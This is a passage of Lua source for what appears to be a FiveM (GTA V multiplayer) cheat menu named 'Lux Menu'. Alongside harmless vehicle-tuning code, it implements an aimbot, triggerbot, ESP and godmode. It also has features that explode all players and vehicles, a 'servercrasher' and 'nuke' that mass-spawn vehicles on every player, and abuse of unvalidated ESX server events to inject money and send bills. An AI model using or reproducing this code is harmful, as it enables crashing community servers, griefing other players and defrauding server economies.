    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
	SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)							
	SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function DelVeh(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end


entityEnumerator = {
	__gc = function(enum)
	  if enum.destructor and enum.handle then
		enum.destructor(enum.handle)
	  end
	  enum.destructor = nil
	  enum.handle = nil
	end
  }

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  local iter, id = initFunc()
	  if not id or id == 0 then
		disposeFunc(iter)
		return
	  end

	  local enum = {handle = iter, destructor = disposeFunc}
	  setmetatable(enum, entityEnumerator)

	  local next = true
	  repeat
		coroutine.yield(id)
		next, id = moveFunc(iter)
	  until not next

	  enum.destructor, enum.handle = nil, nil
	  disposeFunc(iter)
	end)
  end

  function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end

  function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

  function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end

function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end

function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end

-- MAIN CODE --
function displayHelp(text)
end

-- Scaleform Drawing Thread

-- Add an event handler for when the screen is dismissed.
AddEventHandler("optionSelected", function(selected)
    --print(selected) -- do whatever you want with the selected choice.
    -- players can either press the physicial buttons, or they can click
    -- the instructional buttons with their mouse and it will trigger
	-- the event as well.
	GateKeep()
end)

-- Create a thread to loop this warning message.
-- [NOTE] POPUP AUTH WARNING
-- Citizen.CreateThread(function()
-- 	while enabled do
-- 		Citizen.Wait(0)
-- 		AddTextEntry("FACES_WARNH2", _notifTitle)
-- 		AddTextEntry("QM_NO_0", _notifMsg)
-- 		AddTextEntry("QM_NO_3", _notifMsg2)

-- 		while not _gatekeeper and not _auth do
-- 			Citizen.Wait(0)
-- 			-- Display the warning message every tick.
-- 			DrawFrontendAlert("FACES_WARNH2", "QM_NO_0", 2, 0, "QM_NO_3", 2, -1, false, "FM_NXT_RAC", "QM_NO_1", true, _errorCode)
-- 			-- Check for key presses or instructional button clicks.
-- 			-- Input group of 2 is required for this to work while the warning is being displayed.
			
-- 			if (IsControlJustReleased(2, 201) or IsControlJustReleased(2, 217)) then -- any select/confirm key was pressed.
-- 				TriggerEvent("optionSelected", "select")
-- 				break
-- 			elseif (IsControlJustReleased(2, 203)) then -- spacebar/x on controller (alt option) was pressed.
-- 				TriggerEvent("optionSelected", "alt")
-- 				break
-- 			end
-- 			--drawscaleform("POPUP_WARNING")
-- 		end
-- 	end
-- end)


-- Player Blips thread
Citizen.CreateThread(function()
	while isMenuEnabled do
		if playerBlips then
			-- show blips
			for _, id in ipairs(GetActivePlayers()) do
    			local ped = GetPlayerPed(id)
				if ped ~= GetPlayerPed(-1) then
					local blip = GetBlipFromEntity(ped)

					-- HEAD DISPLAY STUFF --

					-- Create head display (this is safe to be spammed)
					-- headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )

					-- Speaking display
					-- I need to move this over to name tag code
					if NetworkIsPlayerTalking(id) then
						Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, true ) -- Add speaking sprite
					else
						Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) -- Remove speaking sprite
					end

					-- BLIP STUFF --

					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
					else -- update blip
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)

						if GetEntityHealth(ped) == 0 then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
							end

							-- Show number in case of passangers
							passengers = GetVehicleNumberOfPassengers(veh)

							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)

							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator

							end
						end

						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale

						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for _, id in ipairs(GetActivePlayers()) do
				local ped = GetPlayerPed(id)
				local blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
			end
		end
		Citizen.Wait(5)
	end
end)

-- Nametags thread
Citizen.CreateThread(function()
	while isMenuEnabled do
		if showNametags then
			for _, id in ipairs(GetActivePlayers()) do
				N_0x31698aa80e0223f8(id) -- RemoveMpGamerTag
			end

			for _, id in ipairs(GetActivePlayers()) do
				if GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
					ped = GetPlayerPed( id )
					--blip = GetBlipFromEntity( ped )

					x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
					x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
					distance = math.round(#(vector3(x1, y1, z1) - vector3(x2, y2, z2)), 1)

					if ((distance < 125)) then
						if NetworkIsPlayerTalking(id) then
							DrawText3D(x2, y2, z2 + 1.25, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "", 30, 144, 255)
						else
							DrawText3D(x2, y2, z2 + 1.25, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "", 255, 255, 255)
						end
					end
				end
			end
		end
		Citizen.Wait(5)
	end
end)

-- [NOTE] MenuToggleThread
Citizen.CreateThread(
	function()
		while isMenuEnabled do
			Citizen.Wait(0)
			-- Radar/showMinimap
			DisplayRadar(showMinimap, 1)
			LUX.Player.inVehicle = IsPedInAnyVehicle(GetPlayerPed(-1), 0)

			SetPlayerInvincible(PlayerId(), Godmode)
			SetEntityInvincible(PlayerPedId(), Godmode)

			if Crosshair then
				ShowHudComponentThisFrame(14)
			end

			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end

			if Invisible then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
			end

			if fastrun then
				SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
				SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
			else
				SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
				SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
			end

			if VehicleGun then
				local VehicleGunVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun is enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(VehicleGunVehicle))
							end
							local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end

			if DeleteGun then
				local gotEntity = getEntity(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!") -- (icon, type, sender, text)
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!")
								end
							end
						end
					end
				end
			end

			if destroyvehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						SetVehicleUndriveable(vehicle,true)
						SetVehicleEngineHealth(vehicle, 100)
					end
				end
			end


			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end

			if esp then
				for _, i in ipairs(GetActivePlayers()) do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local ra = {r = 255, g = 255, b = 255, a = 255}
						local pPed = GetPlayerPed(i)
						local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(pPed))
						local message = 
						    "Name: \t\t" .. GetPlayerName(i) ..
							"\nServer ID: \t" .. GetPlayerServerId(i) ..
							"\nPlayer ID: \t" .. i .. 
							"\nDistance: \t" .. math.round(#(vector3(cx, cy, cz) - vector3(x, y, z)), 1)
						if IsPedInAnyVehicle(pPed, true) then
							local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
							message = message .. string.format("\nVehicle: \t" .. VehName)
						end
				
						DrawText3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)

						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

						DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
					end
				end
			end

			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end

			if blowall then
				for _, i in ipairs(GetActivePlayers()) do
					AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
        		end
			end

			if BlowDrugsUp then
				TriggerServerEvent("esx_drugs:startHarvestWeed")
				TriggerServerEvent("esx_drugs:startHarvestCoke")
				TriggerServerEvent("esx_drugs:startHarvestMeth")
				TriggerServerEvent("esx_drugs:startTransformOpium")
				TriggerServerEvent("esx_drugs:startTransformWeed")
				TriggerServerEvent("esx_drugs:startTransformCoke")
				TriggerServerEvent("esx_drugs:startTransformMeth")
				TriggerServerEvent("esx_drugs:startTransformOpium")
				TriggerServerEvent("esx_drugs:startSellWeed")
				TriggerServerEvent("esx_drugs:startSellCoke")
				TriggerServerEvent("esx_drugs:startSellMeth")
				TriggerServerEvent("esx_drugs:startSellOpium")
			end

			if esxdestroy then
				for _, i in ipairs(GetActivePlayers()) do
					TriggerServerEvent('esx_truckerjob:pay', 9999999999)
					TriggerServerEvent('AdminMenu:giveCash', 9999999999)
					TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)
					TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)
					TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)
					TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Lux Menu", 10000000)
				end
			end

			if servercrasher then
				local model = `jet`
				for _, player in ipairs(GetActivePlayers()) do
					RequestModel(model)
					while not HasModelLoaded(model) do
						Citizen.Wait(0)
					end

					CreateVehicle(model, vector3(GetEntityCoords(GetPlayerPed(player))) - vector3(0.0, -100.0, 0.0), true, false)
				end
			end

			if nuke then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
        		for i = 0, 256 do
					while not HasModelLoaded(GetHashKey(avion)) do
						Citizen.Wait(0)
						RequestModel(GetHashKey(avion))
					end
					Citizen.Wait(200)

					local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
					CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
					CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
					CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
					CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
					CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
					CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
					CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
					CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
					CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
					CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
					CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
					CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
					CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
					CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
        		end
			end

			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 209) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 210) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end

			if TriggerBot then
				local isAiming, targetEntity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
				if isAiming then
					if IsPedAPlayer(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
						ShootPlayer(Entity)
					end
				end
			end

			if AimBot then
				for _, player in ipairs(GetActivePlayers()) do
					if player ~= PlayerId() then
						if IsPlayerFreeAiming(PlayerId()) then
							local TargetPed = GetPlayerPed(player)
							local TargetPos = GetEntityCoords(TargetPed)
							local Exist = DoesEntityExist(TargetPed)
							local Visible = IsEntityVisible(TargetPed)
							local Dead = IsPlayerDead(TargetPed)

							if GetEntityHealth(TargetPed) <= 0 then
								Dead = true
							end

							if Exist and not Dead then
								if Visible then
									local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
									if OnScreen then
										if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
											local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
											SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
										end
									end
								end
							end
						end
					end
				end
			end

			local switch = true

			if RainbowVeh then
				local ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			end

			if ghettopolice then
				local r = { r = 255, g = 0, b = 0 }
				local b = { r = 0, g = 0, b = 255 }

				SetVehicleNeonLightEnabled(GetVehiclePedIsUsing(PlayerPedId()), 0, true)
				SetVehicleNeonLightEnabled(GetVehiclePedIsUsing(PlayerPedId()), 1, true)
				SetVehicleNeonLightEnabled(GetVehiclePedIsUsing(PlayerPedId()), 2, true)
				SetVehicleNeonLightEnabled(GetVehiclePedIsUsing(PlayerPedId()), 3, true)
				ToggleVehicleMod(GetVehiclePedIsUsing(PlayerPedId()), 22, true)
				while ghettopolice do

					if switch then
						SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), r.r, r.g, r.b)
						SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), b.r, b.g, b.b)
						SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId()),b.r,b.g,b.b)
						SetVehicleHeadlightsColour(veh, 8)
						Citizen.Wait(750)
						switch = false
					else
						SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), b.r, b.g, b.b)
